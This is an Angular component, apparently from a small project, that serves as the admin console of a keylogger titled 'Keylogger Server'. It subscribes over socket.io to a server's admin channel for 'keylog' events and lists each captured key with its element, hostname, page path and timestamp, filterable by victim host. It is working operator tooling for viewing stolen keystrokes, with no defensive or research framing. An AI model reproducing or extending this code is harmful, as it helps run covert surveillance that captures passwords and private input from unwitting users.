import { Component, IterableDiffers, ViewChild } from '@angular/core';
import { MatTableDataSource, MatSort } from '@angular/material';
import * as io from 'socket.io-client';

import { environment } from '../environments/environment';

// Import interfaces
import { LogItem } from './log-item'

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css']
})

export class AppComponent {

  @ViewChild('channels') channels;
  @ViewChild(MatSort) sort: MatSort;

  title = 'Keylogger Server';

  socket: any;
  differ: any;

  filter: String;
  showFilter: Boolean;

  items: Array<LogItem> = [];

  hostnames: Array<String> = [];
  selectedHostnames: Array<String> = [];

  dataSource = new MatTableDataSource<LogItem>();
  displayedColumns: Array<String> = [
    'element',
    'key',
    'hostname',
    'path',
    'timestamp'
  ]

  constructor(private iterableDiffers: IterableDiffers) {
    this.differ = this.iterableDiffers.find([]).create(null);
    this.socket = io(`${environment.SERVER_URL}/admin`, {
      autoConnect: true,
      reconnection: true,
      reconnectionAttempts: 'Infinity'
    })
  }

  onSelectionChange () {
    this.selectedHostnames = this.channels.selectedOptions.selected.map(item => item.value)
    if (this.selectedHostnames.length === 0) {
      this.dataSource.data = this.items;
    } else {
      this.dataSource.data = this.items.filter(o => this.selectedHostnames.includes(o.hostname))
    }
  }

  toggleFilter () {
    if (!this.showFilter) {
      this.showFilter = true
    } else {
      this.filter = '';
      this.dataSource.filter = '';
      this.showFilter = false;
    }
  }

  applyFilter(filterValue: string) {
    filterValue = filterValue.trim().toLowerCase();
    this.dataSource.filter = filterValue;
  }

  ngDoCheck() {
      let changes = this.differ.diff(this.items);
      if (changes) {
        this.hostnames = Array.from(
          new Set(this.items.map(item => item.hostname)).values()
        )
      }
  }

  ngOnInit() {
    this.socket.on('keylog', (data) => {
      this.items.push(data);
      this.dataSource.data = this.items
    })

    this.dataSource.data = this.items
  }

  ngAfterViewInit() {
    this.dataSource.sort = this.sort;
  }

}
